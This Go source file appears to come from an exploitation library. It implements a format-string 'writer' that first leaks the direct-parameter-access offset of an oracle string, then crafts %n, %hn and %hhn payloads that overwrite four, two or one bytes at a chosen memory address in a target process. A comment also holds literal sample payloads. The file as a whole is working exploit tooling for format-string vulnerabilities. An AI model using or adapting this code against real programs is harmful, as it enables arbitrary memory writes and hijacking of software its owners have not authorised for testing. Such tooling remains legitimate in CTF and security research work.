package memory

import (
	"bytes"
	"fmt"
)

// DPAFormatStringWriterConfig configures a DPAFormatStringWriter.
//
// TODO: Document the format string structure below:
// %192p%9$n%16197p%10$n
// %192p|%9$n|
type DPAFormatStringWriterConfig struct {
	// MaxWrite is the maximum number that will be written to memory.
	//
	// This is used to structure the format string such that it remains
	// aligned with the amount of memory that the format string function
	// reads per format specifier. This guarantees that the string
	// consistently writes data to the specified pointer.
	MaxWrite int

	// DPAConfig is the DPAFormatStringConfig that will be used to
	// build the format string.
	DPAConfig DPAFormatStringConfig
}

// NewDPAFormatStringWriterOrExit calls NewDPAFormatStringWriter, subsequently
// calling DefaultExitFn if an error occurs.
//
// Refer to NewDPAFormatStringWriter for more information.
func NewDPAFormatStringWriterOrExit(config DPAFormatStringWriterConfig) *DPAFormatStringWriter {
	w, err := NewDPAFormatStringWriter(config)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to create new dpa format string writer - %w", err))
	}
	return w
}

// NewDPAFormatStringWriter creates a new instance of a *DPAFormatStringWriter.
// In order to do this, it first leaks the direct access parameter argument
// number of an oracle string. The oracle is subsequently replaced with
// a memory address that the user would like to write to.
func NewDPAFormatStringWriter(config DPAFormatStringWriterConfig) (*DPAFormatStringWriter, error) {
	if config.MaxWrite <= 0 {
		return nil, fmt.Errorf("maximum write size cannot be less than or equal to zero")
	}

	leakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(dpaLeakSetupConfig{
		dpaConfig: config.DPAConfig,
		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
			fmtStrBuilder := formatStringBuilder{
				returnDataDelim:  []byte("|"),
				endOfStringDelim: []byte("foozlefu"),
			}
			buff := bytes.NewBuffer(nil)
			fmtStrBuilder.appendDPAWrite(
				config.MaxWrite,
				config.DPAConfig.MaxNumParams,
				[]byte("aaa"), // This could potentially be 'hhn'.
				buff)
			return fmtStrBuilder, stringLenMemoryAligned(buff.Bytes(), config.DPAConfig.PointerSize)
		},
	})
	if err != nil {
		return nil, err
	}

	return &DPAFormatStringWriter{
		config:     config,
		leakConfig: leakConfig,
	}, nil
}

// DPAFormatStringWriter abstracts writing data to memory using
// a format string.
//
// Writing memory is accomplished by forcing the format function to write
// new characters to a string, and then writing the number of characters
// created by the function to the specified memory address.
type DPAFormatStringWriter struct {
	// config is the DPAFormatStringWriterConfig used to create
	// this writer.
	config DPAFormatStringWriterConfig

	// leakConfig is the *dpaLeakConfig used to generate the
	// original format string.
	leakConfig *dpaLeakConfig
}

// WriteLowerFourBytesAtOrExit calls WriteLowerFourBytesAt, subsequently
// calling DefaultExitFn if an error occurs.
//
// Refer to DPAFormatStringWriter.WriteLowerFourBytesAt for more information.
func (o DPAFormatStringWriter) WriteLowerFourBytesAtOrExit(newLowerBytes int, pointer Pointer) {
	err := o.WriteLowerFourBytesAt(newLowerBytes, pointer)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerBytes, pointer.HexString(), err))
	}
}

// WriteLowerFourBytesAt attempts to overwrite the lower four bytes of memory
// pointed to by pointer with a new number.
func (o DPAFormatStringWriter) WriteLowerFourBytesAt(newLowerBytes int, pointer Pointer) error {
	fmtStr, err := o.LowerFourBytesFormatString(newLowerBytes, pointer)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		fmtStr,
		o.leakConfig.builder)
	return err
}

// LowerFourBytesFormatString creates a new format string that can be used to
// overwrite the lower four bytes at the memory pointed to by pointer.
func (o DPAFormatStringWriter) LowerFourBytesFormatString(newLowerBytes int, pointer Pointer) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerBytes)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'n'}, buff)

	return append(o.leakConfig.builder.build(o.leakConfig.alignLen, buff), pointer.Bytes()...), nil
}

// WriteLowerTwoBytesAtOrExit calls WriteLowerTwoBytesAt, subsequently calling
// DefaultExitFn if an error occurs.
//
// Refer to DPAFormatStringWriter.WriteLowerTwoBytesAt for more information.
func (o DPAFormatStringWriter) WriteLowerTwoBytesAtOrExit(newLowerBytes int, pointer Pointer) {
	err := o.WriteLowerTwoBytesAt(newLowerBytes, pointer)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerBytes, pointer.HexString(), err))
	}
}

// WriteLowerTwoBytesAt attempts to overwrite the lower two bytes of memory
// pointed to by pointer with a new value.
func (o DPAFormatStringWriter) WriteLowerTwoBytesAt(newLowerBytes int, pointer Pointer) error {
	fmtStr, err := o.LowerTwoBytesFormatString(newLowerBytes, pointer)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		fmtStr,
		o.leakConfig.builder)
	return err
}

// LowerTwoBytesFormatString creates a new format string that can be used to
// overwrite the lower two bytes at the memory pointed to by pointer.
func (o DPAFormatStringWriter) LowerTwoBytesFormatString(newLowerBytes int, pointer Pointer) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerBytes)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'n'}, buff)

	return append(o.leakConfig.builder.build(o.leakConfig.alignLen, buff), pointer.Bytes()...), nil
}

// WriteLowestByteAtOrExit calls WriteLowestByteAt, subsequently calling
// DefaultExitFn if an error occurs.
//
// Refer to DPAFormatStringWriter.WriteLowestByteAt for more information.
func (o DPAFormatStringWriter) WriteLowestByteAtOrExit(newLowerByte int, pointer Pointer) {
	err := o.WriteLowestByteAt(newLowerByte, pointer)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to write %d to %s - %w",
			newLowerByte, pointer.HexString(), err))
	}
}

// WriteLowestByteAt attempts to overwrite the lowest byte of memory pointed
// to by pointer with a new number.
func (o DPAFormatStringWriter) WriteLowestByteAt(newLowerByte int, pointer Pointer) error {
	fmtStr, err := o.LowestByteFormatString(newLowerByte, pointer)
	if err != nil {
		return err
	}

	_, err = leakDataWithFormatString(
		o.config.DPAConfig.ProcessIOFn(),
		fmtStr,
		o.leakConfig.builder)
	return err
}

// LowestByteFormatString creates a new format string that can be used to
// overwrite the lowest byte at the memory pointed to by pointer.
func (o DPAFormatStringWriter) LowestByteFormatString(newLowerByte int, pointer Pointer) ([]byte, error) {
	adjustedNum, err := o.adjustNumToWrite(newLowerByte)
	if err != nil {
		return nil, err
	}

	buff := bytes.NewBuffer(nil)
	o.leakConfig.builder.appendDPAWrite(adjustedNum, o.leakConfig.paramNum, []byte{'h', 'h', 'n'}, buff)

	return append(o.leakConfig.builder.build(o.leakConfig.alignLen, buff), pointer.Bytes()...), nil
}

// adjustNumToWrite checks that the new value to write fits in
// the configuration, and adjusts it based on how many characters
// will have been written by the format function.
func (o DPAFormatStringWriter) adjustNumToWrite(newValue int) (int, error) {
	if newValue <= 0 {
		return 0, fmt.Errorf("the specified write size of %d cannot be less than or equal to 0", newValue)
	}

	if newValue > o.config.MaxWrite {
		return 0, fmt.Errorf("the specified write size of %d cannot be greater than the configured max of %d",
			newValue, o.config.MaxWrite)
	}

	return newValue-len(o.leakConfig.builder.returnDataDelim), nil
}
